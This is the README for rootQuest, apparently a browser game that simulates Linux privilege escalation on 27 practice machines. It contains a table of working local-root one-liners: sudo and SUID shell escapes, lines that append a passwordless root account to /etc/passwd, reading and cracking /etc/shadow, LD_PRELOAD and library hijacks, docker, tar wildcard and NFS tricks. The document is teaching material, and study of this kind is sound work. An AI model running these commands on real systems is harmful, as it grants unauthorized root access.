# rootQuest — Linux Privilege Escalation Playground

A 100% browser-based, vanilla JS terminal game. 27 independent Linux machines, 27 different privilege-escalation vulnerabilities, sorted into difficulty tiers. Enumerate, identify, exploit, root.

## Play

Just open `index.html` in any modern browser. No build, no server, no external dependencies — it's an installable PWA with self-hosted fonts that works fully offline after the first load.

```
open index.html          # macOS
xdg-open index.html      # Linux
start index.html         # Windows
```

## Machines

| # | Box | Tier | Vulnerability | Key command |
|---|-----|------|---------------|-------------|
| 1 | box-01 | Easy | SUID misconfiguration on `find` | `find . -exec /bin/sh -p \;` |
| 2 | box-02 | Easy | World-writable cron script | Overwrite `/opt/backup.sh`, `wait` |
| 3 | box-03 | Medium | Linux capability `cap_setuid+ep` on python3 | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| 4 | box-04 | Medium | PATH hijack against a SUID helper | Fake `ps` in `/tmp`, `export PATH=/tmp:$PATH` |
| 5 | box-05 | Hard | Sudoers NOPASSWD on `vim` | `sudo vim -c ':!/bin/sh'` |
| 6 | box-06 | Easy | World-writable `/etc/passwd` | `echo 'r00t::0:0::/root:/bin/bash' >> /etc/passwd`, `su r00t` |
| 7 | box-07 | Easy | Sudoers NOPASSWD on `awk` (GTFOBins) | `sudo awk 'BEGIN{system("/bin/sh")}'` |
| 8 | box-08 | Medium | Unpatched local root — PwnKit (CVE-2021-4034) | `./pwnkit` |
| 9 | box-09 | Hard | Credential reuse → lateral move → sudo | `su svc`, `sudo bash` |
| 10 | box-10 | Hard | `docker` group membership | `docker run -v /:/mnt -it alpine chroot /mnt sh` |
| 11 | box-11 | Medium | `sudo` env_keep leaks `LD_PRELOAD` | `gcc -shared … x.so`, `sudo LD_PRELOAD=/tmp/x.so apache2ctl` |
| 12 | box-12 | Hard | Wildcard injection into a root `tar` cron | `touch ./--checkpoint-action=exec=sh runme.sh`, `wait` |
| 13 | box-13 | Easy | World-readable root SSH private key | `ssh -i /opt/backup/id_rsa root@localhost` |
| 14 | box-14 | Medium | World-writable `/etc/sudoers.d` drop-in | `echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn`, `sudo bash` |
| 15 | box-15 | Hard | World-writable `/etc/ld.so.preload` | `echo /tmp/x.so > /etc/ld.so.preload`, run any SUID |
| 16 | box-16 | Easy | Sudoers NOPASSWD on `find` (GTFOBins) | `sudo find . -exec /bin/sh \;` |
| 17 | box-17 | Easy | Sudoers NOPASSWD on `env` (GTFOBins) | `sudo env /bin/sh` |
| 18 | box-18 | Medium | Sudoers NOPASSWD on `python3` (GTFOBins) | `sudo python3 -c 'import os; os.system("/bin/sh")'` |
| 19 | box-19 | Medium | Sudoers NOPASSWD on `less` — pager shell-escape (GTFOBins) | `sudo less !/bin/sh` |
| 20 | box-20 | Hard | Sudoers NOPASSWD on `tee`, piped into `/etc/passwd` (GTFOBins) | `echo 'r00t::0:0::/root:/bin/bash' \| sudo tee -a /etc/passwd`, `su r00t` |
| 21 | box-21 | Hard | Linux capability `cap_dac_read_search+ep` on python3 → read + crack `/etc/shadow` | `python3 -c "print(open('/etc/shadow').read())"`, `john /tmp/shadow.copy`, `su root` |
| 22 | box-22 | Hard | `sudo` env_keep leaks `LD_LIBRARY_PATH` (missing-library hijack) | `gcc -shared … libagent.so.1`, `sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent` |
| 23 | box-23 | Hard | NFS export with `no_root_squash` | `showmount -e`, `mount -t nfs box-23:/srv/backups /mnt`, plant + `chmod u+s` a shell in the export |
| 24 | box-24 | Easy | Sudoers NOPASSWD on `perl` (GTFOBins) | `sudo perl -e 'exec "/bin/sh";'` |
| 25 | box-25 | Medium | Sudoers NOPASSWD on `node` (GTFOBins) | `sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'` |
| 26 | box-26 | Medium | `sudoedit`/`sudo -e` with `EDITOR` kept in env_keep | Point `EDITOR` at your own executable, then `sudo EDITOR=/path/to/script -e /etc/motd` |
| 27 | box-27 | Hard | Capability `cap_dac_override` on `python3` (write-DAC bypass) | `python3 -c "open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\n')"`, then `su pwnd` |

## Controls

- `help` — list available commands
- `hint` — get a nudge (3 hints per level, progressive)
- `next` — advance to next machine after rooting
- `reset` — restart the current machine
- `lang en` / `lang fr` — switch language
- `↑ / ↓` — command history (now persisted across machines and reloads)
- `Ctrl+R` — reverse-incremental history search, bash-style
- `Tab` — command & path completion
- `Ctrl+L` — clear screen
- `man <command>` — read a command's manual page; `cd -` — previous directory
- `nano <file>` — full-screen editor (`^O` write out, `^X` exit), backed by the real FS permission rules
- 🎓 **Explain button** (topbar) — toggles "explanation mode": a fully worked, step-by-step commented solution for the current box in the sidebar. Separate from `hint` — free to leave on, doesn't cost a hint slot or affect your S-rank.

## Commands supported

`ls`, `ls -la`, `cd`, `pwd`, `cat`, `find`, `find -perm -4000`, `find -exec ...`, `sudo`, `sudo -l`, `sudo -e`/`sudoedit`, `su`, `ssh`, `docker`, `crontab -l`, `getcap`, `setcap`, `strings`, `chmod`, `echo`, `echo >`, `echo >>`, `export`, `touch`, `gcc`, `python3 -c '...'`, `perl -e '...'`, `node -e '...'`, `awk`, `vim`, `less`, `tee -a`, `john`, `showmount -e`, `mount -t nfs`, `whoami`, `id`, `wait`, `man <cmd>`.

**Enumeration & pipes:** `ps [aux]`, `env`, `uname -a`, `hostname`, `which`, `file`, `history`, `mount`, plus text filters `grep`, `wc`, `head`, `tail`, `sort`, `uniq`, `tee` — usable standalone or in a pipeline (`cat /etc/passwd | grep -v root | wc -l`, `echo payload | sudo tee -a /etc/passwd`).

Redirects (`>`/`>>`) and `tee` now respect file permissions: writing to a file you don't own and can't write fails with `Permission denied` unless you're root or the write is happening through a sudo-granted binary — box-20 relies on exactly that distinction.

`python3 -c "open(path).read()"` also respects file read permissions unless the interpreter has been granted `cap_dac_read_search`/`cap_dac_override` (box-21), in which case it bypasses them like the real capability does — and `sudo <cmd>` bypasses `env_reset` only for variables explicitly listed in a level's `env_keep` (`LD_PRELOAD` for box-11/15, `LD_LIBRARY_PATH` for box-22 — each with its own, deliberately different, hijack requirements). `showmount -e` and `mount -t nfs host:/export /mountpoint` (box-23) work the same way: once mounted, the export's own permissions — not the local directory's — govern reads/writes/`chmod` under it.

## Custom boxes

The hub has a "Custom box" panel (below the machine grid) to import a box from JSON — no build step, no server. Paste JSON matching this shape and hit Import:

```json
{
  "codename": "custom-01",
  "title": "Custom · My Vulnerability",
  "brief": "One or two sentences describing the scenario.",
  "user": "player",
  "host": "custom-01",
  "cwd": "/home/player",
  "objectives": ["Step one", "Step two"],
  "hints": ["Nudge 1", "Nudge 2", "Full solution"],
  "flag": "flag{whatever_you_want}",
  "fs": {
    "/": { "type": "dir", "owner": "root", "mode": "755", "children": ["home"] },
    "/home": { "type": "dir", "owner": "root", "mode": "755", "children": [] }
  },
  "wins": [{ "type": "custom_win" }],
  "debrief": { "vuln": "...", "why": "...", "fix": "...", "link": "https://..." }
}
```

`title`, `brief`, `objectives`, `hints`, and `debrief` accept either a plain string/array or `{ "en": ..., "fr": ... }` for bilingual content — a missing translation falls back to the other language. `fs["/"]` (a root directory node) is the only required filesystem entry; everything else in `fs` is up to you, following the same `{ type, owner, mode, children|content }` shape used by the built-in boxes in `js/levels.js`.

`wins` is checked against the `type` your box's win-condition logic reports — for a self-contained payload (a planted SUID binary, say), set `"exploit": "<your type>"` on that file node in `fs` so running it directly grants root; more elaborate mechanics (matching a specific command sequence) currently require editing `js/commands.js`, same as any built-in box.

Custom boxes are saved to `localStorage` (this browser only) under their own hub tier. Each machine card also has a small `{ }` button that copies that box's JSON to your clipboard — including built-in ones, handy as a starting template.

Custom boxes also get a `🔗` button that copies a self-contained share link instead — the box's JSON, percent-encoded then base64'd into the URL hash (`#box=...`), no server involved. Anyone who opens that link gets the box auto-imported into their own `localStorage` and a confirmation toast; the hash is cleared right after so refreshing or bookmarking the page doesn't re-import it.

## Language

Toggle EN/FR from the top-right, or type `lang fr`.

## Themes

Pick a palette from the theme selector (top bar or hub): **Kali** (default), **Matrix**, **Dracula**, **Amber** (retro CRT), or **Light**. Your choice is saved in `localStorage`.

## Structure

```
privesc-game/
├── index.html         # Entry point
├── styles.css         # Kali/Parrot-inspired terminal styling
├── service-worker.js  # Offline-first cache (PWA)
└── js/
    ├── i18n.js         # Bilingual dictionary
    ├── levels.js       # 23 machines with their filesystems
    ├── walkthrough.js  # Explanation mode: commented solution per box (EN/FR)
    ├── fs.js           # Simulated filesystem
    ├── commands.js     # Command interpreter
    ├── terminal.js     # Terminal UI (history, prompt, rendering)
    ├── sfx.js          # Synthesized sound effects (Web Audio)
    ├── walkmode.js     # Explanation mode toggle state
    ├── proof.js        # Shareable "proof of root" card renderer (canvas)
    ├── nano.js         # Full-screen `nano` editor overlay
    ├── main.js         # Game orchestration
    └── fx.js           # Background visual effects
```

## Development & tests

No build step for the game itself. For the test suite:

```
npm install                 # installs @playwright/test (dev only)
npm run serve               # preview at http://localhost:4173
npm run test:logic          # fast browserless harness (plays all 23 boxes)
npm test                    # Playwright e2e (drives a real browser)
```

- `tests/harness.js` — loads the real engine in a sandbox and plays each box's solution, asserting root (runs in EN and, with `RQLANG=fr`, in French).
- `tests/rootquest.spec.js` — Playwright: one test per machine (solution → root → flag + scorecard), plus hub-render and pipe tests. Locally it uses your installed Chrome; CI uses bundled Chromium.
- CI (`.github/workflows/ci.yml`) runs syntax checks + the harness + Playwright on every push/PR.
- Deploy (`.github/workflows/deploy-pages.yml`) publishes to GitHub Pages on push to `main` (enable once via Settings → Pages → Source: GitHub Actions).

## License

MIT — do whatever. Educational content, no real systems harmed.
